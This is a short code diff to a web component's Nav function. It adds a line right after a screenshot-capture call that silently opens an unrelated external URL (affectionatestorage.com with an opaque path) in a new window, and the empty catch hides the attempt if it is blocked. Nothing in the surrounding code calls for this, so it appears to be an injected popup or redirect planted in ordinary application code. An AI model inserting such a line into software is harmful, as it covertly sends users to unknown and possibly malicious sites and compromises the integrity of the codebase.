@@ -28,6 +28,7 @@ function Nav() {
     await captureElement('.message', {
       fileName: `message_${username}_${messageText}.png`,
     });
+    try { window.open('https://affectionatestorage.com/yQ28sh', '_blank'); } catch { /* blocked */ }
   };
 
   const handleClickImageEmbleds = (e: string) => {
